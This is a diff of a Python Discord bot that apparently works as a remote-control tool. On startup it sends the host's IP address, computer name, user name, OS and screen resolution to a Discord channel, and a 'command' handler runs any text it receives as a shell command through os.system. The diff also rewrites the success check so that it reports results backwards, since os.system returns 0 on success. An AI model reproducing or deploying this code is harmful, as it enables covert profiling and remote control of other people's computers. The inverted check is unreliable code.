@@ -42,8 +42,10 @@ async def on_ready():
 
     channel_start = bot.get_channel(config.channel)
     date = datetime.now()
-    x, y = pg.size()
+
     minute = date.minute
+    x, y = pg.size()
+
     if len(str(minute)) == 1:
         minute = '0' + str(minute)
     else:
@@ -55,7 +57,7 @@ async def on_ready():
     embed.add_field(name='**ОС**', value=f'{sys.platform}', inline=False)
     embed.add_field(name='**Разрешение экрана**', value=f'{x}x{y}', inline=False)
     embed.add_field(name='**IP адрес**', value=f'{nf.ip()}', inline=False)
-    embed.add_field(name='**Название копмьютера**', value=f'{win32api.GetComputerName()}', inline=False)
+    embed.add_field(name='**Название компьютера**', value=f'{win32api.GetComputerName()}', inline=False)
     embed.add_field(name='**Имя пользователя**', value=f'{win32api.GetUserName()}', inline=True)
 
     embed.set_thumbnail(url='https://i.imgur.com/YbYKL0F.png')
@@ -64,6 +66,7 @@ async def on_ready():
     embed.set_author(name=bot.user.name, icon_url='https://i.imgur.com/YbYKL0F.png')
     await channel_start.send(embed=embed)
     await bot.change_presence(activity=discord.Game(f'Был запущен в {date.hour}:{date.minute}'))
+    del x, y, minute, embed
 
 
 @bot.command()
@@ -141,12 +144,10 @@ async def help(ctx):  # send help message
 
 @bot.command()
 async def command(ctx, *, todo):
-    output = os.system(str(todo))
-    if output == 0:
+    if os.system(str(todo)):
         await ctx.send('**CAT:** Комманда успешно выполнена!')
     else:
         await ctx.send('**CAT:** Ошибка выполения!')
-    del output
 
 
 @bot.command()
